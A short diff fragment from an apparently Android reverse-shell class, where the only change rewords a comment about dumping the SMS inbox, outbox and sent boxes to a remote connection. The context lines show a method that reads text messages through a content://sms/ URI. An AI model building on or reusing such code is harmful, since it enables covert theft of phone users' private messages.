@@ -89,7 +89,7 @@ public class ReverseShell extends Activity {
 		private SSLContext sslContext;
 		final String deviceHost = android.os.Build.HOST;
 
-		// Dump the contents of the {inbox,outbox,sent} to the
+		// Dump the contents of {inbox,outbox,sent} to the
 		// connection.
 		public String readSMSBox(String box) {
 			Uri SMSURI = Uri.parse("content://sms/"+box);
